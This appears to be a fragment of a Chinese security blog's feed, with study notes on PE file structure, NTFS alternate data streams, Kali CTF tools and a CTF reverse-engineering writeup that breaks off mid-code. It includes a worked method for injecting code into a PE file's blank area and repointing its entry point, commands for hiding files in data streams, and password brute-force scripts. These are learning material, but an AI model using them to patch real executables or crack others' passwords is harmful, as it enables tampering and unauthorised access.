class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">VA：虚拟内存地址（Virtual Address）PE 文件被操作系统加载进内存后的地址。</span><br><span class="line">RVA：PE文件的相对虚拟地址（Relative Virual Address）是PE文件中的数据、模块等运行在内存中的实际地址相对PE文件装载到内存的基址之间的距离。举例说明，如果PE文件装入虚拟地址(VA)空间的400000h处，且进程从虚址401000h开始执行，我们可以说进程执行起始地址在RVA 1000h。</span><br><span class="line">FOA：文件偏移地址（File Offset Address），和内存无关，它是指某个位置距离文件头的偏移。</span><br><span class="line"></span><br><span class="line">//学习链接：https://blog.csdn.net/weixin_43742894/article/details/105235629</span><br><span class="line"></span><br><span class="line">RVA到FOA的转换:</span><br><span class="line">&lt;1&gt; 得到RVA的值:内存地址-lmageBase</span><br><span class="line">&lt;2&gt; 判断RVA是否位于PE头中，如果是:FOA== RVA</span><br><span class="line">&lt;3&gt; 判断RVA位于哪个节:</span><br><span class="line">RVA&gt;=节.VirtualAddress &amp;&amp; RVA&lt;=节.VirtualAddress +当前节内存对齐后的大小</span><br><span class="line">差值 = RVA - 节.VirtualAddress;</span><br><span class="line">&lt;4&gt; FOA = 节.PointerToRawData + 差值;</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">DWORD SectionAlignment1000h128h4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD FileAlignment200h12Ch4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD SizeOfHeaders400h144h4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD VirtualAddressE260h168h4hFg: Bg:0xFFE0FF.text FOA = 0xD660 </span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210720202153.png" alt="image-20210720202153131"></p><p>E260h &lt;= 1000h+D400h</p><p>RVA&lt;=节.VirtualAddress +当前节内存对齐后的大小</p><p>E260h - 1000h = D260h</p><p>FOA = D260h +400h = D660h</p><h2 id="空白区域添加代码"><a href="#空白区域添加代码" class="headerlink" title="空白区域添加代码"></a>空白区域添加代码</h2><p>弹出错误弹窗例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MessageBox(0,0,0,0); 直接用他的是需要导入表 E8 call不需要导入表</span><br><span class="line">用硬编码</span><br><span class="line">我们要用E8 直接call</span><br><span class="line">&lt;0&gt; 构造要写入的代码</span><br><span class="line">&lt;1&gt; 在PE的空白区构造一段代码</span><br><span class="line">&lt;2&gt;</span><br><span class="line">&lt;3&gt;</span><br><span class="line">6A 00 6A 00 6A 00 6A 00 E8(call) 00 00 00 00 E9(jmp) 00 00 00 00 （后面的计算方法为要跳转的地址）</span><br><span class="line">要跳转的地址-E8指令当前的指令当前的地址-5h（16进制算的）</span><br><span class="line">要跳转的地址-E9指令当前的指令当前的地址-5h（16进制算的）</span><br><span class="line">//执行完还要跳回去所以需要jmp</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193357.png" alt="image-20210326132850887"></p><p>按E 找到user 32 按 CTRL+N 找到MessageBox<img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193400.png" alt="image-20210326132954921"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193403.png" alt="image-20210326133713691"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MessageBox: 76E1FD1E</span><br><span class="line">ImageBase: 400000</span><br><span class="line">MessageBox - （E8指令当前的指令当前文件的地址+ImageBase） -5</span><br><span class="line">76E1FD1E - 400F98 - 5 = 76A1ED81</span><br><span class="line">E8(call) 00 00 00 00</span><br><span class="line">E8(call) 81 ED A1 76</span><br><span class="line">入口: 183D7 （4183D7）</span><br><span class="line">4183D7 - 400F9D -5 = 17435</span><br><span class="line">E9(jmp) 00 00 00 00</span><br><span class="line">E9(jmp) 35 74 01 00</span><br><span class="line">6A 00 6A 00 6A 00 6A 00 E8 81 ED A1 76 E9 35 74 01 00</span><br><span class="line">去找到程序的入口改成90 0f 00 00 </span><br></pre></td></tr></table></figure><h2 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;分配一块新的空间，大小为S</span><br><span class="line">&lt;2&gt;将最后一个节的SizeOfRawData和VirtualSize改成N</span><br><span class="line">N = （SizeOfRawData或者VirtualSize）</span><br><span class="line">内存对齐后的值</span><br><span class="line">&lt;3&gt;</span><br></pre></td></tr></table></figure><h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;判断是否有足够的空间，可以添加一个节表.</span><br><span class="line">&lt;2&gt;在节表中新增一个成员.</span><br><span class="line">&lt;3&gt;修改PE头中节的数量.&lt;4&gt;修改sizeOflmage的大小.</span><br><span class="line">&lt;5&gt;再原有数据的最后，新增一个节的数据(内存对齐的整数倍).</span><br><span class="line">&lt;6&gt;修正新增节表的属性</span><br></pre></td></tr></table></figure><h2 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;按照内存对齐展开</span><br><span class="line">&lt;2&gt;将第一个节的内存大小、文件大小改成一样</span><br><span class="line">Max = SizeOfRawData&gt;VirtualSize?SizeOfRawData:VirtualSize</span><br><span class="line">SizeOfRawData = VirtualSize =</span><br><span class="line">最后一个节的VirtualAddress + Max - SizeOfHeaders内存对齐后的大小.</span><br><span class="line">&lt;3&gt;将第一个节的属性改为包含所有节的属性.</span><br><span class="line">&lt;4&gt;修改节的数量为1.</span><br></pre></td></tr></table></figure><p>学习网站：<a href="https://cloud.tencent.com/developer/article/1432558">https://cloud.tencent.com/developer/article/1432558</a></p><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>表示当前PE文件提供了哪些函数</p><p><strong>通常情况</strong>下exe有导入表，不提供导出表（不提供函数给别人用（不是不能））</p><p>位置：</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193409.png" alt="image-20210329210408067"></p><p>16个结构体，类型都一样 +96个字节（6行）16个数组128个字节</p><p>导出表在哪里，导出表有多大</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193412.png" alt="image-20210329210457617"></p><p>导入表在哪里，导入表有多大</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193414.png" alt="image-20210329210556827"></p><p> 找到的是RVA要转FOA</p><h3 id="导出表计算方法计算方法"><a href="#导出表计算方法计算方法" class="headerlink" title="导出表计算方法计算方法"></a>导出表计算方法计算方法</h3><p>1、找文件对齐</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193416.png" alt="image-20210401152750440"></p><p>找到导出表的RVA为E260h 大小为A3h</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193419.png" alt="image-20210401152832938"></p><p>接着去节表看看再哪个范围内</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193423.png" alt="image-20210401153359965"></p><p>发现第一个节包含1000h-E303h</p><p>包含了导出表</p><p><strong>文件偏移(磁盘文件的位置)=数据目录导出表地址（任意RVA）-该区段相对虚拟地址（RVA）+该区段的文件偏移地址(offset)</strong></p><p>ep：E260h - 1000h + 400h = D660h</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193426.png" alt="image-20210329212133637"></p><p>他的大小是包含子表的，不止40h</p><p>name 是指针</p><p>最后三个address也都是指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct IMAGE_EXPORT_DIRECTORY ExportDirD660hA3hFg: Bg:TWAIN_32.dll</span><br><span class="line">DWORD Characteristics0D660h4hFg: Bg:</span><br><span class="line">time_t TimeDateStamp06/14/2032 19:14:36D664h4hFg: Bg:</span><br><span class="line">WORD MajorVersion0D668h2hFg: Bg:</span><br><span class="line">WORD MinorVersion0D66Ah2hFg: Bg:</span><br><span class="line">DWORD NameE2BEhD66Ch4hFg: Bg:.text FOA = 0xD6BE -&gt; TWAIN_32.dll</span><br><span class="line">DWORD Base1D670h4hFg: Bg:</span><br><span class="line">DWORD NumberOfFunctions6D674h4hFg: Bg:</span><br><span class="line">DWORD NumberOfNames5D678h4hFg: Bg:</span><br><span class="line">DWORD AddressOfFunctionsE288hD67Ch4hFg: Bg:.text FOA = 0xD688 </span><br><span class="line">DWORD AddressOfNamesE2A0hD680h4hFg: Bg:.text FOA = 0xD6A0 </span><br><span class="line">DWORD AddressOfNameOrdinalsE2B4hD684h4hFg: Bg:.text FOA = 0xD6B4 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>看第一个子表 函数地址表 每四个字节一个成员</strong></p><p>可以直接将函数对应的16进制放到OD里看汇编解代码</p><p><strong>看第二个子表 函数名称表 每四个字节一个成员</strong></p><p>是按照首字母顺序排序的</p><p><strong>看第三个子表 函数序号表 每2个字节一个成员</strong></p><p>名称表有几个序号表就有几个 </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193430.png" alt="image-20210401171410292"></p><p>第一参数是dll模块句柄，就是PE文件再内存中展开的起始位置</p><p>第二个可以写函数名或序号</p><p>函数名称 -》 序号表- 》函数地址</p><p>寻找过程</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193432.png" alt="image-20210401172236139"></p><p>序号来找：</p><p>eg:</p><p>15 -&gt; 15 - base &gt;函数地址里找</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193435.png" alt="image-20210329210556827"></p><p>文件对齐是否与内存对齐一样，不一样请将RVA转为FOA</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193438.png" alt="image-20210401184925678"></p><p><strong>有很多个导入表，每个导入表20个字节，一直数到连续20个0结束</strong></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193440.png" alt="image-20210401192412447"></p><p>INT  导入名称表</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721142911.png" alt="image-20210721142911639"></p><p>IAT  导入地址表</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721142934.png" alt="image-20210721142934755"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721144543.png" alt="image-20210721144543602"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721144643.png" alt="image-20210721144643766"></p><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>重定位表在第<strong>6</strong>个</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725154633.png" alt="image-20210721151032756"></p><p><strong>每个重定位表有多大取决于SizeOdBlock有多大</strong></p><p><strong>直到连续8个字节为0结束</strong></p><p>每2个字节代表一个地址</p><p>高位前4位无效  只需要12位</p><p>只有高位为0011 = 3 才需要将VirtualAddress+低12位</p><p>高位不是3是用来填位置的没用的数据，存在的价值是为了内存对齐</p><p>所以修复重定位表的之后需要判断高位是否为3</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PE学习笔记&quot;&gt;&lt;a href=&quot;#PE学习笔记&quot; class=&quot;headerlink&quot; title=&quot;PE学习笔记&quot;&gt;&lt;/a&gt;PE学习笔记&lt;/h1&gt;&lt;p&gt;有一说一，自己看完书在看看视频，可以自己写一两个程序（比如输出hello world）来实战分析一下，印象会</summary>
      
    
    
    
    <category term="PE学习" scheme="http://example.com/categories/PE%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>NTFS交换数据流文件提取</title>
    <link href="http://example.com/2021/08/13/NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81/"/>
    <id>http://example.com/2021/08/13/NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81/</id>
    <published>2021-08-13T11:39:43.639Z</published>
    <updated>2021-08-13T07:57:22.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NTFS交换数据流文件提取"><a href="#NTFS交换数据流文件提取" class="headerlink" title="NTFS交换数据流文件提取"></a>NTFS交换数据流文件提取</h1><p>NTFS交换数据流（简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，而我们无法查看到非主文件数据流，因文件夹大小始终显示0.</p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>NtfsStreamsEditor2</p><p>链接：<a href="https://pan.baidu.com/s/13sQ8hlLshqRDV2gwxuMuBA">https://pan.baidu.com/s/13sQ8hlLshqRDV2gwxuMuBA</a><br>提取码：6oqn</p><p>可能会报毒，注意</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">寄生一:</span><br><span class="line">echo 写入内容&gt;&gt;宿主文件:交换数据流文件（寄生文件）</span><br><span class="line">echo ever&gt;&gt;1.txt:2.txt</span><br><span class="line">2.txt为echo创建出交换数据流文件,ever在2.txt中</span><br><span class="line"></span><br><span class="line">寄生二：</span><br><span class="line">type 交换数据流文件（寄生文件）&gt;&gt;宿主文件夹：交换数据流文件（寄生文件）</span><br><span class="line">type 2.txt&gt;&gt;temp:2.txt</span><br><span class="line">temp为空文件夹,执行后2.txt寄生在temp文件夹上</span><br><span class="line">type a.jpg&gt;&gt;temp:a.jpg</span><br><span class="line">temp为空文件夹,执行后a.jpg寄生在temp文件夹上</span><br><span class="line"></span><br><span class="line">查看：</span><br><span class="line">notepad 宿主文件:交换数据流文件（寄生文件）</span><br><span class="line">notepad 1.txt:2.txt</span><br><span class="line"></span><br><span class="line">查看图片文件：</span><br><span class="line">mspaint 宿主文件:交换数据流文件（寄生文件）</span><br><span class="line">notepad a.jpg:b.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NTFS交换数据流文件提取&quot;&gt;&lt;a href=&quot;#NTFS交换数据流文件提取&quot; class=&quot;headerlink&quot; title=&quot;NTFS交换数据流文件提取&quot;&gt;&lt;/a&gt;NTFS交换数据流文件提取&lt;/h1&gt;&lt;p&gt;NTFS交换数据流（简称ADS）是NTFS磁盘格式的</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>kali工具使用集合</title>
    <link href="http://example.com/2021/08/13/kali%E5%B7%A5%E5%85%B7%E5%92%8C%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/"/>
    <id>http://example.com/2021/08/13/kali%E5%B7%A5%E5%85%B7%E5%92%8C%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/</id>
    <published>2021-08-13T11:39:43.636Z</published>
    <updated>2021-08-13T07:56:50.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali工具使用集合（主要针对misc-持续更新"><a href="#kali工具使用集合（主要针对misc-持续更新" class="headerlink" title="kali工具使用集合（主要针对misc 持续更新"></a>kali工具使用集合（主要针对misc 持续更新</h1><h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>一般用binwalk [文件名]来分析有多少文件</p><p>binwalk -e [文件名]</p><p>可以分离文件</p><h1 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h1><h2 id="一、dd命令的解释"><a href="#一、dd命令的解释" class="headerlink" title="一、dd命令的解释"></a>一、dd命令的解释</h2><p>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。</p><p>注意：指定数字的地方若以下列字符结尾，则乘以相应的数字：b=512；c=1；k=1024；w=2</p><p><strong>参数注释：</strong></p><p>\1. if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;</p><p>\2. of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;</p><p>\3. ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。</p><p>  obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。</p><p>  bs=bytes：同时设置读入/输出的块大小为bytes个字节。</p><p>\4. cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。</p><p>\5. skip=blocks：从输入文件开头跳过blocks个块后再开始复制。</p><p>\6. seek=blocks：从输出文件开头跳过blocks个块后再开始复制。</p><p>注意：通常只用当输出文件是磁盘或磁带时才有效，即备份到磁盘或磁带时才有效。</p><p>\7. count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。</p><p>\8. conv=conversion：用指定的参数转换文件。</p><p>  ascii：转换ebcdic为ascii</p><p>   ebcdic：转换ascii为ebcdic</p><p>  ibm：转换ascii为alternate ebcdic</p><p>  block：把每一行转换为长度为cbs，不足部分用空格填充</p><p>  unblock：使每一行的长度都为cbs，不足部分用空格填充</p><p>  lcase：把大写字符转换为小写字符</p><p>  ucase：把小写字符转换为大写字符</p><p>  swab：交换输入的每对字节</p><p>   noerror：出错时不停止</p><p>   notrunc：不截短输出文件</p><p>  sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</p><h2 id="二、dd应用实例"><a href="#二、dd应用实例" class="headerlink" title="二、dd应用实例"></a>二、dd应用实例</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101537462.png" alt="image-20210810153757356"></p><h1 id="F5隐写-F5-steganography"><a href="#F5隐写-F5-steganography" class="headerlink" title="F5隐写 F5-steganography"></a>F5隐写 F5-steganography</h1><p>安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matthewgao/F5-steganography</span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract [文件名]</span><br></pre></td></tr></table></figure><p>会生成一个output.txt文件</p><h1 id="kali-使用John破解zip压缩包的密码"><a href="#kali-使用John破解zip压缩包的密码" class="headerlink" title="kali 使用John破解zip压缩包的密码"></a>kali 使用John破解zip压缩包的密码</h1><p><strong>准备工具：</strong></p><ol><li>zip压缩包带密码  1个</li><li>kali Linux机器    1个</li></ol><p><strong>操作步骤：</strong></p><ol><li>首先将压缩包上传至kali机器，然后使用zip2john命令爆出hash文件</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john license.zip &gt;&gt; passwd.txt</span><br></pre></td></tr></table></figure><p>　2.然后使用john命令，计算hash文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passwd.txt </span><br></pre></td></tr></table></figure><h1 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h1><p>安装与使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/crorvick/outguess</span><br><span class="line">cd outguess</span><br><span class="line">outguess -r /root/angrybird.jpg -t 11.txt</span><br><span class="line">outguess -k &#x27;abc&#x27; -r  mmm.jpg flag.txt</span><br></pre></td></tr></table></figure><h1 id="vmdk文件解压"><a href="#vmdk文件解压" class="headerlink" title="vmdk文件解压"></a>vmdk文件解压</h1><p>linux中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure><h1 id="隐写工具Steghide"><a href="#隐写工具Steghide" class="headerlink" title="隐写工具Steghide"></a>隐写工具Steghide</h1><p>Steghide是一个可以将文件隐藏到图片或音频中的工具</p><p><strong>安装与使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install steghide</span><br><span class="line"></span><br><span class="line">steghide embed -cf [图片文件载体] -ef [待隐藏文件]</span><br><span class="line">steghide embed -cf 1.jpg -ef 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看图片中嵌入的文件信息</span><br><span class="line">steghide info 1.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入密码后可以看到嵌入的1.txt</span><br><span class="line">提取图片中隐藏的文件</span><br><span class="line">steghide extract -sf 1.jpg</span><br></pre></td></tr></table></figure><p><strong>Steghide爆破密码：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bruteStegHide.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `cat <span class="variable">$2</span>`;<span class="keyword">do</span></span><br><span class="line">    steghide extract -sf <span class="variable">$1</span> -p <span class="variable">$line</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;password is: &#x27;</span><span class="variable">$line</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line">    <span class="keyword">fi</span>  </span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bruteStegHide.sh test.jpg passwd.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kali工具使用集合（主要针对misc-持续更新&quot;&gt;&lt;a href=&quot;#kali工具使用集合（主要针对misc-持续更新&quot; class=&quot;headerlink&quot; title=&quot;kali工具使用集合（主要针对misc 持续更新&quot;&gt;&lt;/a&gt;kali工具使用集合（主要针</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>2020湖湘杯复盘（大概）</title>
    <link href="http://example.com/2021/08/13/2020%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%9B%98/"/>
    <id>http://example.com/2021/08/13/2020%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%9B%98/</id>
    <published>2021-08-13T11:39:43.626Z</published>
    <updated>2021-08-13T07:47:42.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020湖湘杯复盘（大概）"><a href="#2020湖湘杯复盘（大概）" class="headerlink" title="2020湖湘杯复盘（大概）"></a>2020湖湘杯复盘（大概）</h1><p>还是乐哥🐂🍺啊，差一点ak，甚至拿到一血，👴就只能做做签到异或，看看神仙打架🏄‍♂️🤸‍♂️🤺</p><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>这题啊，确实简单，但是👴汇编忘了不说，比赛中知道思路，但还是傻傻的不知道怎么做。赛后乐哥讲的OD中可以用ctrl+G跳到指定地址查看数据，👴才明白，下面来看题</p><p>拿到一个easyre.exe</p><p>用exeinfope分析发现没🐚</p><p>先来运行看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input your flag: 12344221331</span><br><span class="line">Wrong length</span><br></pre></td></tr></table></figure><p>很经典呐，对比字符串的题</p><p>这种题只要找到对比字符和算法就可以解出flag（👴还是太🥗了）</p><p>这题用OD调试</p><p>🔍一下关键字断点调试，发现了运算方法，同时知道字符串长度为24</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150738.png" alt="image-20201106210414537"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shl eax,0x3     ;逻辑左移指令 相当于&lt;&lt; 这里左移了3位</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sar edx,0x5     ;逻辑右移指令 相当于&gt;&gt; 这里右移了5位</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or eax,edx      ;将这两个字符进行或运算</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor eax,dword ptr ss:[ebp-0xC] ;将刚刚的结果异或当前的字符数组下标</span><br></pre></td></tr></table></figure><p>借此可以推算出代码为 <code>enflag[i] = ((flag[i]&lt;&lt;0x3)|(flag[(i+1)%24]&gt;&gt;0x5))^i</code></p><p>接着运行返回到另一个函数时发现对比字符串的位置</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150743.png" alt="image-20201106213104057"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">s = <span class="string">&quot;2B 08 A9 C8 97 2F FF 8C 92 F0 A3 89 F7 26 07 A4 DA EA B3 91 EF DC 95 AB&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;0x&quot;</span> + i.lower(),end = <span class="string">&quot;,&quot;</span>)      </span><br><span class="line"><span class="comment">#0x2b,0x08,0xa9,0xc8,0x97,0x2f,0xff,0x8c,0x92,0xf0,0xa3,0x89,0xf7,0x26,0x07,0xa4,0xda,0xea,0xb3,0x91,0xef,0xdc,0x95,0xab</span></span><br></pre></td></tr></table></figure><p>4*6也是24长度，上脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span 